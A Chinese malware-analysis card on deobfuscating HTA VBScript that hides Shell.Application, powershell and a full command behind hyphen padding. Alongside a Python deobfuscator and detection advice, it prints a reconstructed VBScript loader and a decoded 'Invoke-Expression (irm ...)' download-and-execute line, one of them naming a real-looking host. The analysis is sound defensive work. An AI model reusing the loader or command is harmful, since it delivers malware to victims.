---
id: code-analysis-reverse-obfuscation-hta-vbscript-hyphen-fill-string
title: HTA VBScript 连字符填充字符串还原：Replace 去填充隐藏 Shell.Application/powershell 与整条命令
type: scenario
domain: code-analysis
path: code-analysis/reverse/obfuscation
technique: hta-vbscript-hyphen-fill-string-deobfuscation
aliases:
- HTA 连字符混淆
- VBScript Replace 去填充
- 字符间插入连字符
- Shell.Application 字符串隐藏
- HTA 下载器混淆
- hyphen fill obfuscation
tags:
- reverse
- obfuscation
- hta
- vbscript
- string-obfuscation
- malware-analysis
- windows
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V402
  verified_at: '2026-11-09T13:08:06+08:00'
  notes: 已对照13974原文及38张图核对。图05确认HTA内三段replace(x,"-","")分别还原Shell.Application/powershell/整条命令（样本实际多用双连字符如S--h-e-l-l--），图06进程命令行确认还原结果为 -Command Invoke-Expression (irm -Uri 'flexiblemaria.com/umkglnks')，与卡片描述一致。dedup top候选均为Chr拼接/unescape/空格填充等不同机制，独立成卡成立。无CVE/无sources/无长摘录，路径合法。未验证点：未实际执行样本；原文未声明组件版本。
---

## 一句话结论

恶意 HTA 的 VBScript 把敏感字符串的每个字符之间插入连字符（如 `S-h-e-l-l.-A-p-p-l-i-c-a-t-i-o-n`、`p-o-w-e-r-s-h-e-l-l`，甚至整条 PowerShell 命令），运行时用 `Replace(s, "-", "")` 去掉填充字符还原真实字符串，再经 `CreateObject("Shell.Application").ShellExecute` 以隐藏窗口启动 PowerShell 下载下一阶段；静态扫描按 `Shell.Application`、`powershell` 等关键字匹配时看不到完整字符串。

## 原理

- **填充式字符串混淆**：在明文字符间插入固定分隔符是纯可逆变换，`Replace` 一次即可还原；它改变的是字面量形态，不改变运行语义。敏感词被拆成单字符序列后，YARA/关键字规则对完整 token 的匹配失效，只有做“去填充归一化”的扫描器才能命中。
- **VBScript 运行时还原**：HTA 中的 VBScript 由 `mshta.exe`（本地应用模型）解释执行，`Replace` 是 VBScript 内建函数；三段字符串分别在运行时还原为 COM ProgID（`Shell.Application`）、可执行名（`powershell`）和参数（整条 PowerShell 命令）。
- **命令构造**：还原出的参数形如 `-Command Invoke-Expression (irm -Uri 'http://<c2>/<path>')`，由 PowerShell 拉取并执行下一阶段脚本；`irm` 是 `Invoke-RestMethod` 别名，配合 `Invoke-Expression` 形成下载执行链。
- **隐藏窗口**：`Shell.Application.ShellExecute(File, Arguments, Directory, Operation, Show)` 的 `Show=0` 表示以隐藏窗口启动子进程，用户看不到 PowerShell 窗口；`Window_OnLoad` 让 HTA 打开即执行，无需交互。
- **为什么有效**：脚本本身只是文本，磁盘上唯一“可执行”的宿主是系统自带/签名的 `mshta.exe`；恶意语义只存在于字符串和运行时还原逻辑中，静态检测若不还原填充字符就会漏掉 COM 调用与下载命令。

## 触发条件

- 目标为 Windows，用户被诱导打开/运行下载的 `.hta`（本例由上游 ClickFix 链条用 PowerShell 下载到本地后 `start-process` 启动）。
- `mshta.exe` 未被 AppLocker/WDAC/ASR 禁止，`Shell.Application`/`WScript.Shell` 等 COM 可用。
- PowerShell 未被禁止执行，目标可出网访问 C2 URL。

## 利用步骤

1. 拿到 HTA 文本，定位 `replace("...", "-", "")` 形式的赋值语句。
2. 不做动态执行，直接用脚本把字符串中的 `-` 全部删除，得到真实 ProgID、可执行名与参数命令：
   - `S-h-e-l-l.-A-p-p-l-i-c-a-t-i-o-n` → `Shell.Application`；
   - `p-o-w-e-r-s-h-e-l-l` → `powershell`；
   - `C-o-m-m-a-n-d- -I-n-v-o-k-e-E-x-p-r-e-s-s-i-o-n-...` → `-Command Invoke-Expression (irm -Uri 'http://<c2>/<path>')`。
3. 还原 `CreateObject(...).ShellExecute ...` 调用，确认 File/Arguments/Show 参数与隐藏窗口行为。
4. 提取 C2 URL 与下一阶段脚本特征，按同法继续分析 PS 脚本（XOR/base64/字符码等），全程不执行原样本。

## PoC

还原脚本（Python，静态去填充）：

```python
import re
hta = open("sample.hta", encoding="utf-8", errors="ignore").read()
for m in re.finditer(r'replace\("([^"]*)"\s*,\s*"-"\s*,\s*""\)', hta, re.I):
    print(m.group(1).replace("-", ""))
```

对应样本的 VBScript 结构（示意）：

```vbscript
Sub Window_OnLoad
  cmd = replace("C-o-m-m-a-n-d- -I-n-v-o-k-e-E-x-p-r-e-s-s-i-o-n- -(-i-r-m- -U-r-i- 'http://<c2>/<path>' )", "-", "")
  progid = replace("S-h-e-l-l.-A-p-p-l-i-c-a-t-i-o-n", "-", "")
  exe = replace("p-o-w-e-r-s-h-e-l-l", "-", "")
  CreateObject(progid).ShellExecute exe, cmd, "", "", 0
  self.close
End Sub
```

## 变体与关联

- 变体：填充字符可换成空格、`.`、`x` 等任意字符；还原方式可换成 `Mid` 逐字符循环过滤、`Split/Join`、正则替换或多次 Replace。
- 变体：同思路可用于隐藏 `WScript.Shell`、`MSXML2.XMLHTTP`、`ADODB.Stream` 等 HTA/宏常用 COM 名；VBA 版本见 [[pentest-initial-access-vba-space-split-progid-callbyname-shell-execute]]（空格填充 + Mid 循环 + CallByName）。
- 关联：HTA 作为下载执行容器的通用能力见 [[pentest-initial-access-hta-activex-download-exec-chain]]；ClickFix 把此类 HTA 投递到本地的上游链条见 [[pentest-initial-access-clickfix-clipboard-powershell-self-delivery]]。
- 关联：同类 HTA 多层脚本脱混淆（JS fromCharCode/hex XOR）见 [[code-analysis-reverse-obfuscation-fake-captcha-hta-js-charcode-powershell]]。

## 检测与防御

- 静态检测：先把脚本中的“单字符 + 固定分隔符”序列归一化（去填充、去空格、去点）再做关键字匹配；关注 HTA 中 `Replace(...)` 与 `CreateObject`/`ShellExecute` 共现。
- 行为检测：`mshta.exe` 启动后拉起隐藏窗口的 `powershell.exe`、命令行含 `irm`/`Invoke-Expression`/`DownloadString`，父进程为 mshta/explorer，属高价值告警。
- 防御：AppLocker/WDAC/ASR 限制 `mshta.exe` 与 PowerShell 下载执行；邮件/网页网关拦截 HTML/HTA 附件；开启 PowerShell 脚本块日志与 AMSI。
